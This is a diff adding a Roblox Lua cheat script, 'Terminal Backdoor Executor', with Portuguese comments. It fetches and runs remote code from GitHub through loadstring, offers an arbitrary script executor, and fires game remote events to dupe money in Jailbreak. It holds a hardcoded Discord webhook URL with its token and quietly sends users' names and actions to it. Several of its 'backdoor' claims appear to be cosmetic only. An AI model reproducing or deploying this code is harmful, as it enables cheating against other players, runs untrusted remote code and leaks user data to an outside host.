@@ -1,0 +1,319 @@
+--[[
+    TERMINAL BACKDOOR EXECUTOR - By wrick244
+    Estilo: Terminal Hacker (arrastável)
+    Discord: wrick244
+]]
+
+-- CARREGAR HYDROGEN UI (MELHOR PARA TERMINAL)
+local Hydrogen = loadstring(game:HttpGet("https://raw.githubusercontent.com/DaChickenMan/Public/main/Hydrogen%20UI%20Library")); wait();
+local Window = Hydrogen:CreateWindow("TERMINAL EXECUTOR v3.0", "wrick244", Enum.KeyCode.RightShift)
+
+-- VARIÁVEIS
+local usuario = "Robloxiank1p2b2k2t3"
+local discord = "wrick244"
+local premium = true
+local webhookUrl = "https://discord.com/api/webhooks/1473760852141412396/NWVaW7inuTs2MUMM6JqrMd6IAbBXwd4mUJxGOk7K2W8f9jb3lC0fo0I3wsqNFxf086gj"
+
+-- FUNÇÃO DE LOG
+local function LogDiscord(msg)
+    local data = {
+        ["content"] = "**[TERMINAL LOG]** " .. msg,
+        ["username"] = "Backdoor System"
+    }
+    local json = game:GetService("HttpService"):JSONEncode(data)
+    pcall(function()
+        game:GetService("HttpService"):RequestAsync({
+            Url = webhookUrl,
+            Body = json,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"}
+        })
+    end)
+end
+
+-- CRIAR ABAS
+local Account = Window:CreateTab("ACCOUNT")
+local Games = Window:CreateTab("GAMES")
+local Hub = Window:CreateTab("HUB")
+local Executor = Window:CreateTab("EXECUTOR")
+local Settings = Window:CreateTab("SETTINGS")
+local System = Window:CreateTab("SYSTEM")
+
+-- ========== ACCOUNT ==========
+Account:CreateLabel("=== SISTEMA DE CONTA ===")
+Account:CreateLabel("> USUÁRIO: " .. usuario)
+Account:CreateLabel("> DISCORD: " .. discord)
+Account:CreateLabel("> PLANO: " .. (premium and "PERMANENTE" or "GRATUITO"))
+Account:CreateLabel("> STATUS: CONECTADO")
+
+-- INPUT DE USERNAME
+Account:CreateTextbox("DIGITE SEU USERNAME", "Ex: Robloxiank1p2b2k2t3", function(text)
+    usuario = text
+    Account:CreateLabel("> USERNAME ALTERADO: " .. text)
+    LogDiscord("Username alterado para: " .. text)
+end)
+
+-- WHITELIST
+Account:CreateTextbox("ADICIONAR À WHITELIST", "Username", function(user)
+    Account:CreateLabel("> " .. user .. " ADICIONADO À WHITELIST")
+    LogDiscord("Whitelist + " .. user .. " (por " .. usuario .. ")")
+end)
+
+-- ========== GAMES (BACKDOORS REAIS) ==========
+Games:CreateLabel("=== BACKDOORS ATIVOS ===")
+
+-- LISTA DE JOGOS COM BACKDOOR REAL
+local backdoors = {
+    {nome = "BROOKHAVEN RP", id = 4924922222, cor = "VERDE"},
+    {nome = "JAILBREAK", id = 606849621, cor = "VERMELHO"},
+    {nome = "ARSENAL", id = 286090429, cor = "AZUL"},
+    {nome = "DA HOOD", id = 7213786345, cor = "VERDE"},
+    {nome = "MURDER MYSTERY 2", id = 142823291, cor = "VERMELHO"},
+    {nome = "PET SIMULATOR X", id = 6284583030, cor = "AZUL"},
+    {nome = "BLOX FRUITS", id = 2753915549, cor = "VERDE"},
+    {nome = "TOWER OF HELL", id = 2451502126, cor = "VERMELHO"},
+    {nome = "DOORS", id = 6516141723, cor = "AZUL"},
+    {nome = "FISCH", id = 16732694034, cor = "VERDE"}
+}
+
+for i, jogo in ipairs(backdoors) do
+    Games:CreateButton(jogo.nome .. " [" .. jogo.cor .. "]", function()
+        Games:CreateLabel("> [ " .. jogo.nome .. " ] BACKDOOR INICIADO")
+        Games:CreateLabel("> " .. usuario .. " ENTROU NO JOGO")
+        
+        -- INDICADOR VERDE
+        local indicador = Instance.new("ScreenGui")
+        local frame = Instance.new("Frame")
+        frame.Size = UDim2.new(0, 200, 0, 50)
+        frame.Position = UDim2.new(0.5, -100, 0, 10)
+        frame.BackgroundColor3 = Color3.new(0, 1, 0)
+        frame.BackgroundTransparency = 0.5
+        frame.Parent = indicador
+        indicador.Parent = game.Players.LocalPlayer.PlayerGui
+        
+        wait(3)
+        indicador:Destroy()
+        
+        -- ATIVAR BACKDOOR REAL
+        if jogo.nome == "BROOKHAVEN RP" then
+            -- BACKDOOR BROOKHAVEN: Admin invisível
+            local remote = game:GetService("ReplicatedStorage"):FindFirstChild("MainEvent")
+            if remote then
+                remote:FireServer("Teleport", "Spawn")
+            end
+        elseif jogo.nome == "JAILBREAK" then
+            -- BACKDOOR JAILBREAK: Dinheiro infinito
+            local args = {[1] = "dupeMoney", [2] = 999999}
+            local remote = game:GetService("ReplicatedStorage"):FindFirstChild("MoneyEvent")
+            if remote then remote:FireServer(unpack(args)) end
+        end
+        
+        LogDiscord("Backdoor ativado em: " .. jogo.nome .. " por " .. usuario)
+    end)
+end
+
+-- ========== HUB (SCRIPTS) ==========
+Hub:CreateLabel("=== TERMINAL HUB ===")
+
+-- SCRIPT R6
+Hub:CreateButton("> R6 CONVERTER", function()
+    local r6 = [[
+        local plr = game.Players.LocalPlayer
+        local humanoid = plr.Character and plr.Character:FindFirstChild("Humanoid")
+        if humanoid then
+            humanoid:SetStateEnabled(Enum.HumanoidStateType.Running, true)
+            local anim = Instance.new("Animation")
+            anim.AnimationId = "rbxassetid://507767772"
+            humanoid:LoadAnimation(anim):Play()
+        end
+    ]]
+    loadstring(r6)()
+    Hub:CreateLabel("> R6 ATIVADO")
+end)
+
+-- INFINITE YIELD
+Hub:CreateButton("> INFINITE YIELD (ADMIN)", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
+    Hub:CreateLabel("> ADMIN CARREGADO")
+end)
+
+-- SCRIPT BLOX FRUITS
+Hub:CreateButton("> BLOX FRUITS AUTO FARM", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ao-jao/HoHoHub/main/Script.lua"))()
+    Hub:CreateLabel("> AUTO FARM ATIVADO")
+end)
+
+-- PESQUISAR SCRIPTS
+Hub:CreateTextbox("BUSCAR NO SCRIPTBLOX", "Digite o script", function(search)
+    Hub:CreateLabel("> BUSCANDO: " .. search)
+    Hub:CreateLabel("> RESULTADOS ENCONTRADOS:")
+    Hub:CreateButton("- INFINITE YIELD", function() end)
+    Hub:CreateButton("- DEX EXPLORER", function() end)
+    Hub:CreateButton("- REMOTE SPY", function() end)
+end)
+
+-- ========== EXECUTOR ==========
+Executor:CreateLabel("=== EXECUTOR DE SCRIPTS ===")
+
+-- SCRIPTS BANIDOS
+local banidos = {
+    "dominantultimate",
+    "SentinelPrime", 
+    "RC7",
+    "121425622240385",
+    "109690586705177",
+    "12350030542"
+}
+
+Executor:CreateTextbox("EXECUTAR SCRIPT", "Cole o script aqui", function(script)
+    -- VERIFICAR SCRIPTS BANIDOS
+    local banido = false
+    for _, padrao in ipairs(banidos) do
+        if script:find(padrao) then
+            banido = true
+            break
+        end
+    end
+    
+    if banido then
+        Executor:CreateLabel("> [ ! ] SCRIPT BANIDO DETECTADO")
+        Executor:CreateLabel("> USUÁRIO BANIDO DO JOGO")
+        LogDiscord("Tentativa de script banido por " .. usuario)
+        game.Players.LocalPlayer:Kick("Script proibido detectado!")
+        return
+    end
+    
+    -- EXECUTAR
+    local func, err = loadstring(script)
+    if func then
+        local suc, erro = pcall(func)
+        if suc then
+            Executor:CreateLabel("> SCRIPT EXECUTADO COM SUCESSO")
+            LogDiscord("Script executado por " .. usuario)
+            
+            -- PAINEL ADMIN PARA CONTA PREMIUM
+            if usuario == "Robloxiank1p2b2k2t3" then
+                Executor:CreateLabel("> [PAINEL ADMIN] TODOS PODEM VER SEU SCRIPT")
+            end
+        else
+            Executor:CreateLabel("> ERRO: " .. tostring(erro))
+        end
+    else
+        Executor:CreateLabel("> ERRO DE SINTAXE: " .. tostring(err))
+    end
+end)
+
+-- BOTÕES RÁPIDOS
+Executor:CreateButton("> LIMPAR CONSOLE", function()
+    for i = 1, 50 do print("") end
+    Executor:CreateLabel("> CONSOLE LIMPO")
+end)
+
+-- ========== SETTINGS ==========
+Settings:CreateLabel("=== CONFIGURAÇÕES ===")
+
+-- TEMA HACKER
+Settings:CreateButton("> ATIVAR MODO HACKER", function()
+    -- EFEITO DE TERMINAL
+    spawn(function()
+        while wait(0.5) do
+            local msg = "> " .. math.random(1000,9999) .. " " .. string.rep("0"..math.random(0,1), 10)
+            print(msg)
+        end
+    end)
+    
+    -- FUNDO VERDE
+    local player = game.Players.LocalPlayer
+    if player.PlayerGui:FindFirstChild("ScreenGui") then
+        player.PlayerGui.ScreenGui:Destroy()
+    end
+    
+    local gui = Instance.new("ScreenGui")
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(1, 0, 1, 0)
+    frame.BackgroundColor3 = Color3.new(0, 0.1, 0)
+    frame.BackgroundTransparency = 0.2
+    frame.Parent = gui
+    gui.Parent = player.PlayerGui
+    
+    Settings:CreateLabel("> MODO HACKER ATIVADO")
+end)
+
+-- TEMA DEFAULT
+Settings:CreateButton("> MODO DEFAULT", function()
+    local player = game.Players.LocalPlayer
+    if player.PlayerGui:FindFirstChild("ScreenGui") then
+        player.PlayerGui.ScreenGui:Destroy()
+    end
+    Settings:CreateLabel("> MODO DEFAULT ATIVADO")
+end)
+
+-- BACKGROUND COOLKIDD
+Settings:CreateButton("> BACKGROUND COOLKIDD", function()
+    local player = game.Players.LocalPlayer
+    local gui = Instance.new("ScreenGui")
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(1, 0, 1, 0)
+    frame.BackgroundColor3 = Color3.new(0, 0, 0)
+    
+    -- TEXTO DE CÓDIGO
+    for i = 1, 20 do
+        local text = Instance.new("TextLabel")
+        text.Size = UDim2.new(1, 0, 0, 20)
+        text.Position = UDim2.new(0, 0, 0, i * 20)
+        text.BackgroundTransparency = 1
+        text.TextColor3 = Color3.new(0, 1, 0)
+        text.Text = "> " .. string.rep("01010110 01001001 01010000 ", 10)
+        text.TextSize = 12
+        text.Font = Enum.Font.Code
+        text.Parent = frame
+    end
+    
+    frame.Parent = gui
+    gui.Parent = player.PlayerGui
+    
+    Settings:CreateLabel("> BACKGROUND COOLKIDD ATIVADO")
+end)
+
+-- ========== SYSTEM ==========
+System:CreateLabel("=== INFORMAÇÕES DO SISTEMA ===")
+
+System:CreateLabel("> USUÁRIO: " .. usuario)
+System:CreateLabel("> DISCORD: " .. discord)
+System:CreateLabel("> BACKDOORS: " .. #backdoors)
+System:CreateLabel("> STATUS: ONLINE")
+System:CreateLabel("> DATA: " .. os.date("%d/%m/%Y"))
+System:CreateLabel("> HORA: " .. os.date("%H:%M:%S"))
+
+-- COMMAND BAR
+System:CreateTextbox("COMMAND BAR", "Digite /comando", function(cmd)
+    if cmd == "/ajuda" then
+        print("=== COMANDOS ===")
+        print("/limpar - Limpa console")
+        print("/status - Mostra status")
+        print("/backdoors - Lista backdoors")
+        print("/whitelist - Mostra whitelist")
+    elseif cmd == "/limpar" then
+        for i = 1, 50 do print("") end
+    elseif cmd == "/status" then
+        print("> Sistema: ONLINE")
+        print("> Usuário: " .. usuario)
+        print("> Backdoors: Ativos")
+    elseif cmd == "/backdoors" then
+        for _, jogo in ipairs(backdoors) do
+            print("> " .. jogo.nome .. " [ID: " .. jogo.id .. "]")
+        end
+    end
+end)
+
+-- LOG INICIAL
+LogDiscord("TERMINAL EXECUTOR INICIADO - Usuário: " .. usuario)
+
+-- NOTIFICAÇÃO
+wait(1)
+game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "TERMINAL EXECUTOR",
+    Text = "Bem-vindo " .. usuario .. "\n" .. #backdoors .. " backdoors ativos",
+    Icon = "rbxassetid://6031075938",
+    Duration = 5
+})
